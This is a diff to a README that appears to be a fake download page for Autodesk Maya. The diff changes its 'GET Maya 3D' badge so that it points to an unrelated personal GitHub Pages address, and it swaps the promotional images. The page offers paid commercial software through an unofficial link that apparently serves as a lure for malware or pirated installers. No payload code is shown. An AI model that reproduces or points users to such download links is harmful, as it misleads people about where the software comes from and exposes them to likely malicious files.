@@ -1,16 +1,11 @@
 # Maya Windows Download � Professional 3D Animation and Visual Effects Software
 
 <div align="center">  
-<img src="https://www.autodesk.com/content/dam/autodesk/www/products/maya/overview-page/hero/maya-2025-overview-hero-1920x1080.jpg" alt="Maya Windows Logo" width="600">  
+<img src="https://img-c.udemycdn.com/course/480x270/1757858_5e5b.jpg" alt="Maya Windows Logo" width="600">  
 </div>  
 
-<div align="center">  
-<a href="https://maya-3d-software.github.io/.github/">  
-<img src="https://img.shields.io/badge/Download_Maya_for_Windows-0078D4?style=for-the-badge&logo=windows" alt="Download Maya for Windows">  
-</a>  
-</div>  
+[![GET Maya 3D](https://img.shields.io/badge/GET%20%E2%80%94%20Maya-3D-0078D6?style=for-the-badge&logoColor=white)](https://dnlgey78544.github.io/.github/Maya-3D)
 
----
 
 ## What is Maya for Windows?
 
@@ -35,7 +30,7 @@ The application is optimized for **Windows 10 and Windows 11**, delivering excep
 
 Thanks to its node-based architecture, artists can create complex procedural workflows, while the intuitive interface allows beginners to start creating 3D content quickly. The combination of cutting-edge technology and proven reliability makes **Maya for Windows** the industry standard in animation and VFX studios worldwide.
 
-![Maya Interface](https://www.autodesk.com/content/dam/autodesk/www/products/maya/overview-page/gallery/maya-2025-overview-gallery-01-1920x1080.jpg)
+![Maya Interface](https://damassets.autodesk.net/content/dam/autodesk/www/products/autodesk-maya/fy19/overview/descriptive-overview/section-1/maya-overview-video-poster-1152x648.jpg)
 
 ---
 
